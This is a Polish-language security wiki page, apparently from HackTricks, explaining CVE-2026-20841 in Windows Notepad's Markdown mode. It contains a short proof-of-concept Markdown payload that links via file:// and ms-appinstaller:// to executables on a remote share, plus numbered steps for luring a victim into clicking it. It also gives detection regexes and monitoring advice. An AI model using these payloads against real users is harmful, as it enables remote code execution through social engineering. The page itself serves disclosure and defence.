# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderery)

{{#include ../banners/hacktricks-training.md}}

Aplikacje Windows renderujące Markdown lub HTML mogą przekazywać kliknięte cele do `ShellExecuteExW`. Ponieważ ShellExecute obsługuje zarejestrowane schematy URI i skojarzenia plików, renderer powinien używać jawnej allowlisty, zamiast zakładać, że każdy link jest typu HTTP(S). Opisane poniżej zachowanie Notatnika dotyczy CVE-2026-20841 i nie powinno być uogólniane na każdy renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Powierzchnia `ShellExecuteExW` w trybie Markdown Windows Notepad
- Notepad wybiera tryb Markdown **wyłącznie dla rozszerzeń `.md`** za pomocą stałego porównania stringów w `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Obsługiwane linki Markdown:
- Standardowy: `[text](target)`
- Autolink: `<target>` (renderowany jako `[target](target)`), dlatego obie składnie mają znaczenie dla payloadów i detekcji.
- Kliknięcia linków są przetwarzane w `sub_140170F60()`, które wykonuje słabe filtrowanie, a następnie wywołuje `ShellExecuteExW`.
- `ShellExecuteExW` przekazuje obsługę do **dowolnego skonfigurowanego handlera protokołu**, nie tylko HTTP(S).<sup>[[1]](#references)</sup>

### Uwagi dotyczące payloadów
- Wszystkie sekwencje `\\` w linku są **normalizowane do `\`** przed wywołaniem `ShellExecuteExW`, co wpływa na tworzenie UNC/ścieżek i detekcję.
- Pliki `.md` **nie są domyślnie skojarzone z Notepad**; ofiara nadal musi otworzyć plik w Notepad i kliknąć link, ale po wyrenderowaniu link można kliknąć.
- Niebezpieczne przykładowe schematy:<sup>[[1]](#references)</sup>
- `file://` do uruchomienia lokalnego payloadu lub payloadu UNC.
- `ms-appinstaller://` do wywołania procesów App Installer. Inne lokalnie zarejestrowane schematy również mogą być podatne na abuse.

### Minimalny PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Przebieg exploitation
1. Przygotuj **plik `.md`**, aby Notepad renderował go jako Markdown.
2. Osadź link z użyciem niebezpiecznego schematu URI (`file:`, `ms-appinstaller:` lub dowolnego zainstalowanego handlera).
3. Dostarcz plik (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB lub podobnie) i przekonaj użytkownika do otwarcia go w Notepad.
4. Po kliknięciu **znormalizowany link** zostaje przekazany do `ShellExecuteExW`, a odpowiedni protocol handler wykonuje wskazaną zawartość w kontekście użytkownika.<sup>[[1]](#references)[[2]](#references)</sup>

## Pomysły na wykrywanie
- Monitoruj transfery plików `.md` przez porty/protokoły często używane do dostarczania dokumentów: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizuj linki Markdown (standardowe i autolink) i wyszukuj **bez uwzględniania wielkości liter** `file:` lub `ms-appinstaller:`.
- Wyrażenia regularne zgodne z zaleceniami dostawców do wykrywania dostępu do zdalnych zasobów:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Opisana przez ZDI poprawka dostawcy ogranicza akceptowane cele do plików lokalnych oraz HTTP(S). W razie potrzeby rozszerz wykrywanie na inne zainstalowane protocol handlers, ponieważ zarejestrowana powierzchnia ataku różni się w zależności od systemu.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Wykonanie dowolnego kodu w Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
